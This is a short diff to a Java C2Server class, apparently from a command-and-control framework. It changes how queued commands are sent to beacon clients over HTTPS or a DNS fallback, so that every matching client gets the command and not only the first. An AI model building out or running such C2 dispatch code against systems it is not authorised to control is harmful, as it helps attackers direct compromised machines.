@@ -208,16 +208,16 @@ public class C2Server implements Runnable{
             if (beaconClientHttpsMap.keySet().contains(clientIP)){
                 if((System.currentTimeMillis() - clientLastSeen.get(clientIP).getTime()) < 300000){
                     longRangeBeacons.get(beaconClientHttpsMap.get(clientIP)).sendToBeacon(commandJSON.toString());
-                    return;
+                    // Reached this client over HTTPS; skip the DNS fallback and move to the next match
+                    continue;
                 }
-            } 
+            }
             if (beaconClientDnsMap.keySet().contains(clientIP)){
                 if((System.currentTimeMillis() - dnsClientLastSeen.get(clientIP).getTime()) < 300000){
                     longRangeBeacons.get(beaconClientDnsMap.get(clientIP)).sendToBeacon(commandJSON.toString());
                 }
             }
         }
-        
     }
 
     /**
